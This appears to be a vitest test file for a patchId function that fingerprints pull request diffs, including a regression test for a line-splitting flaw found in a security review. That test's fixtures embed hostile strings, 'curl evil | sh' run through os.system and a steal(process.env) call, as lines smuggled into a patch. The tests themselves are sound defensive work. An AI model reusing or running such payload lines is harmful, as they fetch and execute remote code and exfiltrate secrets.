/**
 * A pull request's patch id (#3394): the same for a plain rebase or a main merge that leaves the pull request's own diff
 * unchanged, different for any changed line, as `git patch-id` is.
 */
import { describe, expect, it } from 'vitest'
import { patchId, type PullRequestFile } from './pullRequestPatch.js'

const file = (filename: string, patch: string | undefined, extra: Partial<PullRequestFile> = {}): PullRequestFile =>
  ({ filename, status: 'modified', sha: `blob-${filename}`, ...patch === undefined ? {} : { patch }, ...extra })
const parser = '@@ -10,3 +10,4 @@ export function parse()\n context\n-old\n+new\n+more'

describe('a patch id', () => {
  it('ignores where hunks start, and the order files come in', () => {
    const moved = parser.replace('@@ -10,3 +10,4 @@ export function parse()', '@@ -42,3 +45,4 @@ function parse()')
    expect(patchId([file('a.ts', parser), file('b.ts', '@@ -1 +1 @@\n-x\n+y')]))
      .toBe(patchId([file('b.ts', '@@ -1 +1 @@\n-x\n+y'), file('a.ts', moved)]))
  })

  it('changes with any changed line, file name or status', () => {
    const base = patchId([file('a.ts', parser)])
    expect(patchId([file('a.ts', parser.replace('+more', '+less'))])).not.toBe(base)
    expect(patchId([file('a.ts', `${parser}\n context`)])).not.toBe(base)
    expect(patchId([file('c.ts', parser)])).not.toBe(base)
    expect(patchId([file('a.ts', parser, { status: 'renamed', previousFilename: 'old.ts' })])).not.toBe(base)
    expect(patchId([file('a.ts', parser), file('b.ts', '@@ -1 +1 @@\n-x\n+y')])).not.toBe(base)
  })

  it('reads a file GitHub gives no patch for (binary, too large) by its blob', () => {
    expect(patchId([file('logo.png', undefined)])).toBe(patchId([file('logo.png', undefined)]))
    expect(patchId([file('logo.png', undefined)])).not.toBe(patchId([file('logo.png', undefined, { sha: 'other' })]))
  })

  it('is no id for no files', () => {
    expect(patchId([])).toBeNull()
  })

  // Security review of #3218 (Warden2), Critical 1: a lone CR, U+2028 or U+2029 inside a line began a "line" that read as a
  // hunk header, and the rest of the real line was dropped, so two different patches had one id.
  it('reads lines split at a line feed only, and only a real hunk header loses its positions', () => {
    for (const mark of ['\u2028', '\u2029', '\r']) {
      const line = `+s = "${mark}@@ a @@ "`
      expect(patchId([file('a.py', `@@ -1 +1 @@\n${line}`)])).not.toBe(patchId([file('a.py', `@@ -1 +1 @@\n${line}; os.system("curl evil | sh")`)]))
    }
    expect(patchId([file('a.ts', '@@ -1 +1 @@\n+x = `\r@@ b @@ `')])).not.toBe(patchId([file('a.ts', '@@ -1 +1 @@\n+x = `\r@@ b @@ ${steal(process.env)}`')]))
    // A line of the file that merely starts with "@@" is content, kept whole.
    expect(patchId([file('a.md', '@@ -1 +1 @@\n+@@ -1 +1 @@ one')])).not.toBe(patchId([file('a.md', '@@ -1 +1 @@\n+@@ -1 +1 @@ two')]))
  })

  it('keeps the function a hunk header names', () => {
    expect(patchId([file('a.ts', parser)])).not.toBe(patchId([file('a.ts', parser.replace('export function parse()', 'export function other()'))]))
  })
})
